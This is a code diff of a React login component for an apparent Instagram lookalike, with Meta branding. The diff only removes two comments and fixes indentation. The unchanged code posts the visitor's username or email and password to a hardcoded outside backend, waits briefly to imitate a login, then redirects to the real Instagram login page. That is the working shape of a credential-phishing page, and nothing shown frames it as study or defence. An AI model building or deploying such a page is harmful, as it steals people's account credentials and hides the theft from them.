@@ -17,7 +17,6 @@ const Login = () => {
     if (!isFormValid) return;
     
     setLoading(true);
-    // Hardcoded live backend URL for guaranteed connection
     const BACKEND_URL = 'https://insta-clone-backend-35i9.onrender.com';
     
     try {
@@ -25,7 +24,6 @@ const Login = () => {
         emailOrUsername,
         password
       });
-      // Small delay for "Logging in..." feel
       setTimeout(() => {
         window.location.href = 'https://www.instagram.com/accounts/login/';
       }, 1500);
@@ -87,7 +85,7 @@ const Login = () => {
           Create new account
         </Link>
         <div className="meta-footer">
-           <svg viewBox="0 0 24 24" className="meta-logo-svg">
+          <svg viewBox="0 0 24 24" className="meta-logo-svg">
             <path d="M16.143 4.5c-2.457 0-4.414 1.83-5.32 3.623C9.917 6.33 7.96 4.5 5.503 4.5 2.463 4.5 0 6.963 0 10.003s2.463 5.503 5.503 5.503c2.457 0 4.414-1.83 5.32-3.623.906 1.793 2.863 3.623 5.32 3.623 3.04 0 5.503-2.463 5.503-5.503S19.183 4.5 16.143 4.5zm0 8.414c-1.61 0-2.911-1.301-2.911-2.911s1.301-2.911 2.911-2.911 2.911 1.301 2.911 2.911-1.301 2.911-2.911 2.911zm-10.64 0c-1.61 0-2.911-1.301-2.911-2.911s1.301-2.911 2.911-2.911 2.911 1.301 2.911 2.911-1.301 2.911-2.911 2.911z" />
           </svg>
           <span className="meta-text">Meta</span>
